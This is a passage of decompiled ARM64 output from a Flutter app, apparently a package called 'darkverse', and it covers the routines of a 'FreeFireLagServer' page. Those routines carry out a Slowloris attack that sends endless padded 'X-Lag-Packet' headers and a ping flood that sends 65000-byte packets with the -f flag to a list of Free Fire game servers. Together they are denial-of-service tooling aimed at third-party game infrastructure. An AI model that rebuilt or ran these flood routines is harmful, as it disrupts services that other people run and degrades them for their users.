    //     0x87bf7c: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c160] "User-Agent: Slowloris-FreeFire\r\n"
    //     0x87bf80: ldr             x2, [x2, #0x160]
    // 0x87bf84: r0 = GDT[cid_x0 + -0xedf]()
    //     0x87bf84: sub             lr, x0, #0xedf
    //     0x87bf88: ldr             lr, [x21, lr, lsl #3]
    //     0x87bf8c: blr             lr
    // 0x87bf90: ldur            x1, [fp, #-0xa8]
    // 0x87bf94: r0 = LoadClassIdInstr(r1)
    //     0x87bf94: ldur            x0, [x1, #-1]
    //     0x87bf98: ubfx            x0, x0, #0xc, #0x14
    // 0x87bf9c: r2 = "Accept: */*\r\n"
    //     0x87bf9c: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c168] "Accept: */*\r\n"
    //     0x87bfa0: ldr             x2, [x2, #0x168]
    // 0x87bfa4: r0 = GDT[cid_x0 + -0xedf]()
    //     0x87bfa4: sub             lr, x0, #0xedf
    //     0x87bfa8: ldr             lr, [x21, lr, lsl #3]
    //     0x87bfac: blr             lr
    // 0x87bfb0: ldur            x2, [fp, #-0xa0]
    // 0x87bfb4: r1 = Function '<anonymous closure>': static.
    //     0x87bfb4: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c170] AnonymousClosure: static (0x87c108), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startSlowloris (0x87bbdc)
    //     0x87bfb8: ldr             x1, [x1, #0x170]
    // 0x87bfbc: r0 = AllocateClosure()
    //     0x87bfbc: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87bfc0: stur            x0, [fp, #-0xa0]
    // 0x87bfc4: r0 = LoadStaticField(0x3a4)
    //     0x87bfc4: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87bfc8: ldr             x0, [x0, #0x748]
    // 0x87bfcc: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87bfd0: cmp             w0, w16
    // 0x87bfd4: b.ne            #0x87bfe0
    // 0x87bfd8: r2 = _current
    //     0x87bfd8: ldr             x2, [PP, #0x1d0]  ; [pp+0x1d0] Field <Zone._current@5048458>: static late (offset: 0x3a4)
    // 0x87bfdc: r0 = InitLateStaticField()
    //     0x87bfdc: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87bfe0: r16 = Instance__RootZone
    //     0x87bfe0: ldr             x16, [PP, #0x1d8]  ; [pp+0x1d8] Obj!_RootZone@a3cdf1
    // 0x87bfe4: cmp             w0, w16
    // 0x87bfe8: b.ne            #0x87c01c
    // 0x87bfec: r1 = LoadClassIdInstr(r0)
    //     0x87bfec: ldur            x1, [x0, #-1]
    //     0x87bff0: ubfx            x1, x1, #0xc, #0x14
    // 0x87bff4: mov             x16, x0
    // 0x87bff8: mov             x0, x1
    // 0x87bffc: mov             x1, x16
    // 0x87c000: ldur            x3, [fp, #-0xa0]
    // 0x87c004: r2 = Instance_Duration
    //     0x87c004: add             x2, PP, #0x15, lsl #12  ; [pp+0x15308] Obj!Duration@a44231
    //     0x87c008: ldr             x2, [x2, #0x308]
    // 0x87c00c: r0 = GDT[cid_x0 + -0xdaf]()
    //     0x87c00c: sub             lr, x0, #0xdaf
    //     0x87c010: ldr             lr, [x21, lr, lsl #3]
    //     0x87c014: blr             lr
    // 0x87c018: b               #0x87c074
    // 0x87c01c: r1 = LoadClassIdInstr(r0)
    //     0x87c01c: ldur            x1, [x0, #-1]
    //     0x87c020: ubfx            x1, x1, #0xc, #0x14
    // 0x87c024: r16 = <Timer>
    //     0x87c024: ldr             x16, [PP, #0x4fb0]  ; [pp+0x4fb0] TypeArguments: <Timer>
    // 0x87c028: stp             x0, x16, [SP, #8]
    // 0x87c02c: ldur            x16, [fp, #-0xa0]
    // 0x87c030: str             x16, [SP]
    // 0x87c034: mov             x0, x1
    // 0x87c038: r4 = const [0x1, 0x2, 0x2, 0x2, null]
    //     0x87c038: ldr             x4, [PP, #0x40]  ; [pp+0x40] List(5) [0x1, 0x2, 0x2, 0x2, Null]
    // 0x87c03c: r0 = GDT[cid_x0 + -0xe6b]()
    //     0x87c03c: sub             lr, x0, #0xe6b
    //     0x87c040: ldr             lr, [x21, lr, lsl #3]
    //     0x87c044: blr             lr
    // 0x87c048: r1 = LoadStaticField(0x3a4)
    //     0x87c048: ldr             x1, [THR, #0x78]  ; THR::field_table_values
    //     0x87c04c: ldr             x1, [x1, #0x748]
    // 0x87c050: r2 = LoadClassIdInstr(r1)
    //     0x87c050: ldur            x2, [x1, #-1]
    //     0x87c054: ubfx            x2, x2, #0xc, #0x14
    // 0x87c058: mov             x3, x0
    // 0x87c05c: mov             x0, x2
    // 0x87c060: r2 = Instance_Duration
    //     0x87c060: add             x2, PP, #0x15, lsl #12  ; [pp+0x15308] Obj!Duration@a44231
    //     0x87c064: ldr             x2, [x2, #0x308]
    // 0x87c068: r0 = GDT[cid_x0 + -0xdaf]()
    //     0x87c068: sub             lr, x0, #0xdaf
    //     0x87c06c: ldr             lr, [x21, lr, lsl #3]
    //     0x87c070: blr             lr
    // 0x87c074: r0 = LoadStaticField(0xd70)
    //     0x87c074: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c078: ldr             x0, [x0, #0x1ae0]
    // 0x87c07c: r1 = LoadInt32Instr(r0)
    //     0x87c07c: sbfx            x1, x0, #1, #0x1f
    //     0x87c080: tbz             w0, #0, #0x87c088
    //     0x87c084: ldur            x1, [x0, #7]
    // 0x87c088: add             x2, x1, #1
    // 0x87c08c: r0 = BoxInt64Instr(r2)
    //     0x87c08c: sbfiz           x0, x2, #1, #0x1f
    //     0x87c090: cmp             x2, x0, asr #1
    //     0x87c094: b.eq            #0x87c0a0
    //     0x87c098: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x87c09c: stur            x2, [x0, #7]
    // 0x87c0a0: mov             x2, x0
    // 0x87c0a4: StoreStaticField(0xd70, r2)
    //     0x87c0a4: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c0a8: str             x2, [x0, #0x1ae0]
    // 0x87c0ac: b               #0x87c0b4
    // 0x87c0b0: sub             SP, fp, #0xd8
    // 0x87c0b4: ldur            x2, [fp, #-0x80]
    // 0x87c0b8: ldur            x3, [fp, #-0x98]
    // 0x87c0bc: ldur            x4, [fp, #-0x90]
    // 0x87c0c0: b               #0x87bd6c
    // 0x87c0c4: mov             x0, x3
    // 0x87c0c8: StoreField: r0->field_1f = rNULL
    //     0x87c0c8: stur            NULL, [x0, #0x1f]
    // 0x87c0cc: r0 = Null
    //     0x87c0cc: mov             x0, NULL
    // 0x87c0d0: r0 = ReturnAsyncNotFuture()
    //     0x87c0d0: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87c0d4: mov             x0, x2
    // 0x87c0d8: r0 = ConcurrentModificationError()
    //     0x87c0d8: bl              #0x4576a0  ; AllocateConcurrentModificationErrorStub -> ConcurrentModificationError (size=0x10)
    // 0x87c0dc: mov             x1, x0
    // 0x87c0e0: ldur            x0, [fp, #-0x80]
    // 0x87c0e4: StoreField: r1->field_b = r0
    //     0x87c0e4: stur            w0, [x1, #0xb]
    // 0x87c0e8: mov             x0, x1
    // 0x87c0ec: r0 = Throw()
    //     0x87c0ec: bl              #0xbf5dcc  ; ThrowStub
    // 0x87c0f0: brk             #0
    // 0x87c0f4: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87c0f4: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87c0f8: b               #0x87bd00
    // 0x87c0fc: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87c0fc: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87c100: b               #0x87bd7c
    // 0x87c104: r0 = RangeErrorSharedWithoutFPURegs()
    //     0x87c104: bl              #0xbf8204  ; RangeErrorSharedWithoutFPURegsStub
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87c108, size: 0x200
    // 0x87c108: EnterFrame
    //     0x87c108: stp             fp, lr, [SP, #-0x10]!
    //     0x87c10c: mov             fp, SP
    // 0x87c110: AllocStack(0x80)
    //     0x87c110: sub             SP, SP, #0x80
    // 0x87c114: SetupParameters(dynamic _ /* r1 */, dynamic _ /* r2, fp-0x68 */)
    //     0x87c114: stur            NULL, [fp, #-8]
    //     0x87c118: mov             x0, #0
    //     0x87c11c: add             x1, fp, w0, sxtw #2
    //     0x87c120: ldr             x1, [x1, #0x18]
    //     0x87c124: add             x2, fp, w0, sxtw #2
    //     0x87c128: ldr             x2, [x2, #0x10]
    //     0x87c12c: stur            x2, [fp, #-0x68]
    //     0x87c130: ldur            w3, [x1, #0x17]
    //     0x87c134: add             x3, x3, HEAP, lsl #32
    //     0x87c138: stur            x3, [fp, #-0x60]
    // 0x87c13c: CheckStackOverflow
    //     0x87c13c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c140: cmp             SP, x16
    //     0x87c144: b.ls            #0x87c2f8
    // 0x87c148: InitAsync() -> Future<void?>
    //     0x87c148: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x87c14c: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x87c150: r0 = LoadStaticField(0xd6c)
    //     0x87c150: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c154: ldr             x0, [x0, #0x1ad8]
    // 0x87c158: tbnz            w0, #4, #0x87c1d0
    // 0x87c15c: ldur            x2, [fp, #-0x60]
    // 0x87c160: LoadField: r3 = r2->field_f
    //     0x87c160: ldur            w3, [x2, #0xf]
    // 0x87c164: DecompressPointer r3
    //     0x87c164: add             x3, x3, HEAP, lsl #32
    // 0x87c168: stur            x3, [fp, #-0x70]
    // 0x87c16c: r0 = LoadClassIdInstr(r3)
    //     0x87c16c: ldur            x0, [x3, #-1]
    //     0x87c170: ubfx            x0, x0, #0xc, #0x14
    // 0x87c174: mov             x1, x3
    // 0x87c178: r0 = GDT[cid_x0 + 0x8a0]()
    //     0x87c178: add             lr, x0, #0x8a0
    //     0x87c17c: ldr             lr, [x21, lr, lsl #3]
    //     0x87c180: blr             lr
    // 0x87c184: mov             x1, x0
    // 0x87c188: stur            x1, [fp, #-0x78]
    // 0x87c18c: r0 = Await()
    //     0x87c18c: bl              #0x4a3d90  ; AwaitStub
    // 0x87c190: mov             x3, x0
    // 0x87c194: r2 = Null
    //     0x87c194: mov             x2, NULL
    // 0x87c198: r1 = Null
    //     0x87c198: mov             x1, NULL
    // 0x87c19c: stur            x3, [fp, #-0x78]
    // 0x87c1a0: r4 = 60
    //     0x87c1a0: mov             x4, #0x3c
    // 0x87c1a4: branchIfSmi(r0, 0x87c1b0)
    //     0x87c1a4: tbz             w0, #0, #0x87c1b0
    // 0x87c1a8: r4 = LoadClassIdInstr(r0)
    //     0x87c1a8: ldur            x4, [x0, #-1]
    //     0x87c1ac: ubfx            x4, x4, #0xc, #0x14
    // 0x87c1b0: cmp             x4, #0x3f
    // 0x87c1b4: b.eq            #0x87c1c8
    // 0x87c1b8: r8 = bool
    //     0x87c1b8: ldr             x8, [PP, #0x27b8]  ; [pp+0x27b8] Type: bool
    // 0x87c1bc: r3 = Null
    //     0x87c1bc: add             x3, PP, #0x3c, lsl #12  ; [pp+0x3c178] Null
    //     0x87c1c0: ldr             x3, [x3, #0x178]
    // 0x87c1c4: r0 = bool()
    //     0x87c1c4: bl              #0xbfdfa8  ; IsType_bool_Stub
    // 0x87c1c8: ldur            x0, [fp, #-0x78]
    // 0x87c1cc: tbnz            w0, #4, #0x87c1e0
    // 0x87c1d0: ldur            x1, [fp, #-0x68]
    // 0x87c1d4: r0 = cancel()
    //     0x87c1d4: bl              #0x4746e0  ; [dart:isolate] _Timer::cancel
    // 0x87c1d8: r0 = Null
    //     0x87c1d8: mov             x0, NULL
    // 0x87c1dc: r0 = ReturnAsyncNotFuture()
    //     0x87c1dc: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87c1e0: r1 = Null
    //     0x87c1e0: mov             x1, NULL
    // 0x87c1e4: r2 = 6
    //     0x87c1e4: mov             x2, #6
    // 0x87c1e8: r0 = AllocateArray()
    //     0x87c1e8: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87c1ec: stur            x0, [fp, #-0x68]
    // 0x87c1f0: r16 = "X-Lag-Packet: "
    //     0x87c1f0: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c188] "X-Lag-Packet: "
    //     0x87c1f4: ldr             x16, [x16, #0x188]
    // 0x87c1f8: StoreField: r0->field_f = r16
    //     0x87c1f8: stur            w16, [x0, #0xf]
    // 0x87c1fc: r1 = <String>
    //     0x87c1fc: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87c200: r2 = 2048
    //     0x87c200: mov             x2, #0x800
    // 0x87c204: r0 = AllocateArray()
    //     0x87c204: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87c208: r1 = 0
    //     0x87c208: mov             x1, #0
    // 0x87c20c: CheckStackOverflow
    //     0x87c20c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c210: cmp             SP, x16
    //     0x87c214: b.ls            #0x87c300
    // 0x87c218: cmp             x1, #0x400
    // 0x87c21c: b.ge            #0x87c238
    // 0x87c220: add             x2, x0, x1, lsl #2
    // 0x87c224: r16 = "X"
    //     0x87c224: ldr             x16, [PP, #0x57a0]  ; [pp+0x57a0] "X"
    // 0x87c228: StoreField: r2->field_f = r16
    //     0x87c228: stur            w16, [x2, #0xf]
    // 0x87c22c: add             x2, x1, #1
    // 0x87c230: mov             x1, x2
    // 0x87c234: b               #0x87c20c
    // 0x87c238: ldur            x3, [fp, #-0x70]
    // 0x87c23c: ldur            x2, [fp, #-0x68]
    // 0x87c240: mov             x1, x0
    // 0x87c244: r4 = const [0, 0x1, 0, 0x1, null]
    //     0x87c244: ldr             x4, [PP, #0x208]  ; [pp+0x208] List(5) [0, 0x1, 0, 0x1, Null]
    // 0x87c248: r0 = join()
    //     0x87c248: bl              #0x56af10  ; [dart:collection] ListBase::join
    // 0x87c24c: ldur            x1, [fp, #-0x68]
    // 0x87c250: ArrayStore: r1[1] = r0  ; List_4
    //     0x87c250: add             x25, x1, #0x13
    //     0x87c254: str             w0, [x25]
    //     0x87c258: tbz             w0, #0, #0x87c274
    //     0x87c25c: ldurb           w16, [x1, #-1]
    //     0x87c260: ldurb           w17, [x0, #-1]
    //     0x87c264: and             x16, x17, x16, lsr #2
    //     0x87c268: tst             x16, HEAP, lsr #32
    //     0x87c26c: b.eq            #0x87c274
    //     0x87c270: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87c274: ldur            x0, [fp, #-0x68]
    // 0x87c278: r16 = "\r\n"
    //     0x87c278: add             x16, PP, #0x11, lsl #12  ; [pp+0x11258] "\r\n"
    //     0x87c27c: ldr             x16, [x16, #0x258]
    // 0x87c280: ArrayStore: r0[0] = r16  ; List_4
    //     0x87c280: stur            w16, [x0, #0x17]
    // 0x87c284: str             x0, [SP]
    // 0x87c288: r0 = _interpolate()
    //     0x87c288: bl              #0x45bb80  ; [dart:core] _StringBase::_interpolate
    // 0x87c28c: ldur            x1, [fp, #-0x70]
    // 0x87c290: r2 = LoadClassIdInstr(r1)
    //     0x87c290: ldur            x2, [x1, #-1]
    //     0x87c294: ubfx            x2, x2, #0xc, #0x14
    // 0x87c298: mov             x16, x0
    // 0x87c29c: mov             x0, x2
    // 0x87c2a0: mov             x2, x16
    // 0x87c2a4: r0 = GDT[cid_x0 + -0xedf]()
    //     0x87c2a4: sub             lr, x0, #0xedf
    //     0x87c2a8: ldr             lr, [x21, lr, lsl #3]
    //     0x87c2ac: blr             lr
    // 0x87c2b0: r3 = LoadStaticField(0xd70)
    //     0x87c2b0: ldr             x3, [THR, #0x78]  ; THR::field_table_values
    //     0x87c2b4: ldr             x3, [x3, #0x1ae0]
    // 0x87c2b8: r4 = LoadInt32Instr(r3)
    //     0x87c2b8: sbfx            x4, x3, #1, #0x1f
    //     0x87c2bc: tbz             w3, #0, #0x87c2c4
    //     0x87c2c0: ldur            x4, [x3, #7]
    // 0x87c2c4: add             x3, x4, #1
    // 0x87c2c8: r0 = BoxInt64Instr(r3)
    //     0x87c2c8: sbfiz           x0, x3, #1, #0x1f
    //     0x87c2cc: cmp             x3, x0, asr #1
    //     0x87c2d0: b.eq            #0x87c2dc
    //     0x87c2d4: bl              #0xbf7e54  ; AllocateMintSharedWithoutFPURegsStub
    //     0x87c2d8: stur            x3, [x0, #7]
    // 0x87c2dc: mov             x2, x0
    // 0x87c2e0: StoreStaticField(0xd70, r2)
    //     0x87c2e0: ldr             x3, [THR, #0x78]  ; THR::field_table_values
    //     0x87c2e4: str             x2, [x3, #0x1ae0]
    // 0x87c2e8: b               #0x87c2f0
    // 0x87c2ec: sub             SP, fp, #0x80
    // 0x87c2f0: r0 = Null
    //     0x87c2f0: mov             x0, NULL
    // 0x87c2f4: r0 = ReturnAsyncNotFuture()
    //     0x87c2f4: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87c2f8: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87c2f8: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87c2fc: b               #0x87c148
    // 0x87c300: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87c300: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87c304: b               #0x87c218
  }
  static void _startPingFlood() {
    // ** addr: 0x87c308, size: 0xf0
    // 0x87c308: EnterFrame
    //     0x87c308: stp             fp, lr, [SP, #-0x10]!
    //     0x87c30c: mov             fp, SP
    // 0x87c310: AllocStack(0x18)
    //     0x87c310: sub             SP, SP, #0x18
    // 0x87c314: CheckStackOverflow
    //     0x87c314: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c318: cmp             SP, x16
    //     0x87c31c: b.ls            #0x87c3f0
    // 0x87c320: r1 = Function '<anonymous closure>': static.
    //     0x87c320: add             x1, PP, #0x3c, lsl #12  ; [pp+0x3c190] AnonymousClosure: static (0x87c3f8), in [package:darkverse/FreeFireLagServer.dart] _FreeFireLagServerPageState::_startPingFlood (0x87c308)
    //     0x87c324: ldr             x1, [x1, #0x190]
    // 0x87c328: r2 = Null
    //     0x87c328: mov             x2, NULL
    // 0x87c32c: r0 = AllocateClosure()
    //     0x87c32c: bl              #0xbf6eac  ; AllocateClosureStub
    // 0x87c330: mov             x3, x0
    // 0x87c334: r1 = Null
    //     0x87c334: mov             x1, NULL
    // 0x87c338: r2 = Instance_Duration
    //     0x87c338: add             x2, PP, #0x3c, lsl #12  ; [pp+0x3c198] Obj!Duration@a44491
    //     0x87c33c: ldr             x2, [x2, #0x198]
    // 0x87c340: r0 = Timer.periodic()
    //     0x87c340: bl              #0x570930  ; [dart:async] Timer::Timer.periodic
    // 0x87c344: stur            x0, [fp, #-8]
    // 0x87c348: r0 = LoadStaticField(0xd74)
    //     0x87c348: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c34c: ldr             x0, [x0, #0x1ae8]
    // 0x87c350: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87c354: cmp             w0, w16
    // 0x87c358: b.ne            #0x87c368
    // 0x87c35c: r2 = _timers
    //     0x87c35c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3be60] Field <_FreeFireLagServerPageState@829239838._timers@829239838>: static late (offset: 0xd74)
    //     0x87c360: ldr             x2, [x2, #0xe60]
    // 0x87c364: r0 = InitLateStaticField()
    //     0x87c364: bl              #0xbf5cf4  ; InitLateStaticFieldStub
    // 0x87c368: stur            x0, [fp, #-0x18]
    // 0x87c36c: LoadField: r1 = r0->field_b
    //     0x87c36c: ldur            w1, [x0, #0xb]
    // 0x87c370: LoadField: r2 = r0->field_f
    //     0x87c370: ldur            w2, [x0, #0xf]
    // 0x87c374: DecompressPointer r2
    //     0x87c374: add             x2, x2, HEAP, lsl #32
    // 0x87c378: LoadField: r3 = r2->field_b
    //     0x87c378: ldur            w3, [x2, #0xb]
    // 0x87c37c: r2 = LoadInt32Instr(r1)
    //     0x87c37c: sbfx            x2, x1, #1, #0x1f
    // 0x87c380: stur            x2, [fp, #-0x10]
    // 0x87c384: r1 = LoadInt32Instr(r3)
    //     0x87c384: sbfx            x1, x3, #1, #0x1f
    // 0x87c388: cmp             x2, x1
    // 0x87c38c: b.ne            #0x87c398
    // 0x87c390: mov             x1, x0
    // 0x87c394: r0 = _growToNextCapacity()
    //     0x87c394: bl              #0x4578a8  ; [dart:core] _GrowableList::_growToNextCapacity
    // 0x87c398: ldur            x2, [fp, #-0x18]
    // 0x87c39c: ldur            x3, [fp, #-0x10]
    // 0x87c3a0: add             x4, x3, #1
    // 0x87c3a4: lsl             x5, x4, #1
    // 0x87c3a8: StoreField: r2->field_b = r5
    //     0x87c3a8: stur            w5, [x2, #0xb]
    // 0x87c3ac: LoadField: r1 = r2->field_f
    //     0x87c3ac: ldur            w1, [x2, #0xf]
    // 0x87c3b0: DecompressPointer r1
    //     0x87c3b0: add             x1, x1, HEAP, lsl #32
    // 0x87c3b4: ldur            x0, [fp, #-8]
    // 0x87c3b8: ArrayStore: r1[r3] = r0  ; List_4
    //     0x87c3b8: add             x25, x1, x3, lsl #2
    //     0x87c3bc: add             x25, x25, #0xf
    //     0x87c3c0: str             w0, [x25]
    //     0x87c3c4: tbz             w0, #0, #0x87c3e0
    //     0x87c3c8: ldurb           w16, [x1, #-1]
    //     0x87c3cc: ldurb           w17, [x0, #-1]
    //     0x87c3d0: and             x16, x17, x16, lsr #2
    //     0x87c3d4: tst             x16, HEAP, lsr #32
    //     0x87c3d8: b.eq            #0x87c3e0
    //     0x87c3dc: bl              #0xbf5df0  ; ArrayWriteBarrierStub
    // 0x87c3e0: r0 = Null
    //     0x87c3e0: mov             x0, NULL
    // 0x87c3e4: LeaveFrame
    //     0x87c3e4: mov             SP, fp
    //     0x87c3e8: ldp             fp, lr, [SP], #0x10
    // 0x87c3ec: ret
    //     0x87c3ec: ret             
    // 0x87c3f0: r0 = StackOverflowSharedWithoutFPURegs()
    //     0x87c3f0: bl              #0xbf7cd4  ; StackOverflowSharedWithoutFPURegsStub
    // 0x87c3f4: b               #0x87c320
  }
  [closure] static Future<void> <anonymous closure>(dynamic, Timer) async {
    // ** addr: 0x87c3f8, size: 0x230
    // 0x87c3f8: EnterFrame
    //     0x87c3f8: stp             fp, lr, [SP, #-0x10]!
    //     0x87c3fc: mov             fp, SP
    // 0x87c400: AllocStack(0x90)
    //     0x87c400: sub             SP, SP, #0x90
    // 0x87c404: SetupParameters(dynamic _ /* r1 */)
    //     0x87c404: stur            NULL, [fp, #-8]
    //     0x87c408: mov             x0, #0
    //     0x87c40c: add             x1, fp, w0, sxtw #2
    //     0x87c410: ldr             x1, [x1, #0x18]
    //     0x87c414: ldur            w2, [x1, #0x17]
    //     0x87c418: add             x2, x2, HEAP, lsl #32
    //     0x87c41c: stur            x2, [fp, #-0x68]
    // 0x87c420: CheckStackOverflow
    //     0x87c420: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c424: cmp             SP, x16
    //     0x87c428: b.ls            #0x87c614
    // 0x87c42c: InitAsync() -> Future<void?>
    //     0x87c42c: ldr             x0, [PP, #0x360]  ; [pp+0x360] TypeArguments: <void?>
    //     0x87c430: bl              #0x4a3fd4  ; InitAsyncStub
    // 0x87c434: r0 = LoadStaticField(0xd6c)
    //     0x87c434: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c438: ldr             x0, [x0, #0x1ad8]
    // 0x87c43c: tbz             w0, #4, #0x87c448
    // 0x87c440: r0 = Null
    //     0x87c440: mov             x0, NULL
    // 0x87c444: r0 = ReturnAsyncNotFuture()
    //     0x87c444: b               #0x4a3bc8  ; ReturnAsyncNotFutureStub
    // 0x87c448: r0 = LoadStaticField(0xd84)
    //     0x87c448: ldr             x0, [THR, #0x78]  ; THR::field_table_values
    //     0x87c44c: ldr             x0, [x0, #0x1b08]
    // 0x87c450: ldr             x16, [THR, #0x90]  ; THR::object_sentinel
    // 0x87c454: cmp             w0, w16
    // 0x87c458: b.ne            #0x87c468
    // 0x87c45c: r2 = freefireServers
    //     0x87c45c: add             x2, PP, #0x3b, lsl #12  ; [pp+0x3bd98] Field <_FreeFireLagServerPageState@829239838.freefireServers>: static late final (offset: 0xd84)
    //     0x87c460: ldr             x2, [x2, #0xd98]
    // 0x87c464: r0 = InitLateFinalStaticField()
    //     0x87c464: bl              #0xbf5c8c  ; InitLateFinalStaticFieldStub
    // 0x87c468: r1 = <String>
    //     0x87c468: ldr             x1, [PP, #0x3e0]  ; [pp+0x3e0] TypeArguments: <String>
    // 0x87c46c: stur            x0, [fp, #-0x70]
    // 0x87c470: r0 = ListIterator()
    //     0x87c470: bl              #0x49a80c  ; AllocateListIteratorStub -> ListIterator<X0> (size=0x24)
    // 0x87c474: mov             x4, x0
    // 0x87c478: ldur            x3, [fp, #-0x70]
    // 0x87c47c: stur            x4, [fp, #-0x88]
    // 0x87c480: StoreField: r4->field_b = r3
    //     0x87c480: stur            w3, [x4, #0xb]
    // 0x87c484: LoadField: r0 = r3->field_b
    //     0x87c484: ldur            w0, [x3, #0xb]
    // 0x87c488: r5 = LoadInt32Instr(r0)
    //     0x87c488: sbfx            x5, x0, #1, #0x1f
    // 0x87c48c: stur            x5, [fp, #-0x80]
    // 0x87c490: StoreField: r4->field_f = r5
    //     0x87c490: stur            x5, [x4, #0xf]
    // 0x87c494: ArrayStore: r4[0] = rZR  ; List_8
    //     0x87c494: stur            xzr, [x4, #0x17]
    // 0x87c498: r6 = 12
    //     0x87c498: mov             x6, #0xc
    // 0x87c49c: CheckStackOverflow
    //     0x87c49c: ldr             x16, [THR, #0x48]  ; THR::stack_limit
    //     0x87c4a0: cmp             SP, x16
    //     0x87c4a4: b.ls            #0x87c61c
    // 0x87c4a8: LoadField: r0 = r3->field_b
    //     0x87c4a8: ldur            w0, [x3, #0xb]
    // 0x87c4ac: r1 = LoadInt32Instr(r0)
    //     0x87c4ac: sbfx            x1, x0, #1, #0x1f
    // 0x87c4b0: cmp             x5, x1
    // 0x87c4b4: b.ne            #0x87c5f4
    // 0x87c4b8: ArrayLoad: r2 = r4[0]  ; List_8
    //     0x87c4b8: ldur            x2, [x4, #0x17]
    // 0x87c4bc: cmp             x2, x1
    // 0x87c4c0: b.ge            #0x87c5e4
    // 0x87c4c4: mov             x0, x1
    // 0x87c4c8: mov             x1, x2
    // 0x87c4cc: cmp             x1, x0
    // 0x87c4d0: b.hs            #0x87c624
    // 0x87c4d4: LoadField: r0 = r3->field_f
    //     0x87c4d4: ldur            w0, [x3, #0xf]
    // 0x87c4d8: DecompressPointer r0
    //     0x87c4d8: add             x0, x0, HEAP, lsl #32
    // 0x87c4dc: ArrayLoad: r7 = r0[r2]  ; Unknown_4
    //     0x87c4dc: add             x16, x0, x2, lsl #2
    //     0x87c4e0: ldur            w7, [x16, #0xf]
    // 0x87c4e4: DecompressPointer r7
    //     0x87c4e4: add             x7, x7, HEAP, lsl #32
    // 0x87c4e8: mov             x0, x7
    // 0x87c4ec: stur            x7, [fp, #-0x78]
    // 0x87c4f0: StoreField: r4->field_1f = r0
    //     0x87c4f0: stur            w0, [x4, #0x1f]
    //     0x87c4f4: ldurb           w16, [x4, #-1]
    //     0x87c4f8: ldurb           w17, [x0, #-1]
    //     0x87c4fc: and             x16, x17, x16, lsr #2
    //     0x87c500: tst             x16, HEAP, lsr #32
    //     0x87c504: b.eq            #0x87c50c
    //     0x87c508: bl              #0xbf6294  ; WriteBarrierWrappersStub
    // 0x87c50c: add             x0, x2, #1
    // 0x87c510: ArrayStore: r4[0] = r0  ; List_8
    //     0x87c510: stur            x0, [x4, #0x17]
    // 0x87c514: mov             x2, x6
    // 0x87c518: r1 = Null
    //     0x87c518: mov             x1, NULL
    // 0x87c51c: r0 = AllocateArray()
    //     0x87c51c: bl              #0xbf7bc8  ; AllocateArrayStub
    // 0x87c520: stur            x0, [fp, #-0x90]
    // 0x87c524: r16 = "-c"
    //     0x87c524: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3beb0] "-c"
    //     0x87c528: ldr             x16, [x16, #0xeb0]
    // 0x87c52c: StoreField: r0->field_f = r16
    //     0x87c52c: stur            w16, [x0, #0xf]
    // 0x87c530: r16 = "1"
    //     0x87c530: add             x16, PP, #0xe, lsl #12  ; [pp+0xec90] "1"
    //     0x87c534: ldr             x16, [x16, #0xc90]
    // 0x87c538: StoreField: r0->field_13 = r16
    //     0x87c538: stur            w16, [x0, #0x13]
    // 0x87c53c: r16 = "-s"
    //     0x87c53c: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3beb8] "-s"
    //     0x87c540: ldr             x16, [x16, #0xeb8]
    // 0x87c544: ArrayStore: r0[0] = r16  ; List_4
    //     0x87c544: stur            w16, [x0, #0x17]
    // 0x87c548: r16 = "65000"
    //     0x87c548: add             x16, PP, #0x3c, lsl #12  ; [pp+0x3c1a0] "65000"
    //     0x87c54c: ldr             x16, [x16, #0x1a0]
    // 0x87c550: StoreField: r0->field_1b = r16
    //     0x87c550: stur            w16, [x0, #0x1b]
    // 0x87c554: r16 = "-f"
    //     0x87c554: add             x16, PP, #0x3b, lsl #12  ; [pp+0x3bec8] "-f"
    //     0x87c558: ldr             x16, [x16, #0xec8]
    // 0x87c55c: StoreField: r0->field_1f = r16
    //     0x87c55c: stur            w16, [x0, #0x1f]
    // 0x87c560: ldur            x2, [fp, #-0x78]
